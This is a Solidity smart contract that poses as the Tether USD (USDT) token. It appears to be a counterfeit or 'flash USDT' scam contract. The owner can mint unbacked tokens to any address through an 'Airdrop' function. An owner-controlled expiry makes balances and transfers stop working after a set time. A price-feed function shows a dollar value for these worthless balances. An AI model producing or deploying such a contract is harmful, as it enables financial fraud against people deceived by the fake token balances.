// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function allowance(address tokenOwner, address spender) external view returns (uint256);
}

interface AggregatorV3Interface {
    function latestRoundData() external view returns (
        uint80 roundID,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    );
}

contract TetherToken {
    string private constant _name = "Tether USD";
    string private constant _symbol = "USDT";
    uint8 private constant _decimals = 6;

    uint256 private _totalSupply;
    address public owner;
    address public admin;
    uint256 public tokenExpiry;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed tokenOwner, address indexed spender, uint256 value);

    mapping(address => uint256) private _Balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    // Chainlink price feed interface
    AggregatorV3Interface internal priceFeed;

    constructor(uint256 duration, address _admin, address _priceFeed) {
        owner = msg.sender;
        admin = _admin;
        tokenExpiry = block.timestamp + duration;
        _totalSupply = 0;

        // Set up Chainlink oracle price feed
        priceFeed = AggregatorV3Interface(_priceFeed);
    }

    modifier onlyWhileActive() {
        require(block.timestamp < tokenExpiry, "Token has expired");
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can perform this action");
        _;
    }

    // Explicit ERC-20 metadata functions for Etherscan & wallets
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view onlyWhileActive returns (uint256) {
        return _Balances[account];
    }

    /**
     * @dev Fetches the latest USDT/USD price from the Chainlink oracle.
     * Chainlink price feeds return values with 8 decimals, so we adjust accordingly.
     */
    function getUSDTPrice() public view returns (uint256) {
        (, int256 price, , , ) = priceFeed.latestRoundData();
        require(price > 0, "Invalid price from oracle");

        // Convert price to 6 decimals to match USDT decimals
        return uint256(price) / 10**2;
    }

    /**
     * @dev Returns the USD value of a user's USDT balance based on real-time price feed.
     */
    function USDTValue(address account) public view returns (uint256) {
        uint256 price = getUSDTPrice();
        uint256 balance = balanceOf(account);
        return (balance * price) / (10**_decimals);
    }

    function transfer(address recipient, uint256 amount) public onlyWhileActive returns (bool) {
        require(_Balances[msg.sender] >= amount, "Insufficient balance");
        _Balances[msg.sender] -= amount;
        _Balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public onlyWhileActive returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address tokenOwner, address spender) public view returns (uint256) {
        return _allowances[tokenOwner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public onlyWhileActive returns (bool) {
        require(_Balances[sender] >= amount, "Insufficient balance");
        require(_allowances[sender][msg.sender] >= amount, "Transfer amount exceeds allowance");

        _Balances[sender] -= amount;
        _Balances[recipient] += amount;
        _allowances[sender][msg.sender] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function Airdrop(address user, uint256 amount) public onlyOwner onlyWhileActive {
        _Balances[user] += amount;
        _totalSupply += amount;
        emit Transfer(address(0), user, amount);
    }

    function isExpired() public view returns (bool) {
        return block.timestamp >= tokenExpiry;
    }

    function extendExpiry(uint256 additionalTime) public onlyOwner {
        tokenExpiry += additionalTime;
    }

    function setExpiry(uint256 newExpiry) public onlyOwner {
        require(newExpiry > block.timestamp, "New expiry must be in the future");
        tokenExpiry = newExpiry;
    }
}